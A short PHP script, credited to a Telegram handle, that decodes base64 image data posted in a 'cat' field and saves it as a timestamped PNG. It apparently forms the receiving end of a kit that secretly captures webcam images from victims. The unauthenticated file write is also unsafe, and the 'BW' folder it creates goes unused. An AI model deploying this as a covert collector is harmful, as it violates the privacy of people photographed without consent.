<?php
/***********************
https://t.me/BlackWacker
************************/
if(!isset($_POST['cat']) || empty($_POST['cat'])) exit();
$data = $_POST['cat'];
$data = substr($data, strpos($data, ',') + 1);
$data = base64_decode($data);
if(!file_exists('BW')) {
    mkdir('BW');
}
$file = 'images';
$file .= date('Y-m-d-H-i-s');
$file .= '.png';
file_put_contents($file, $data);
unset($data);
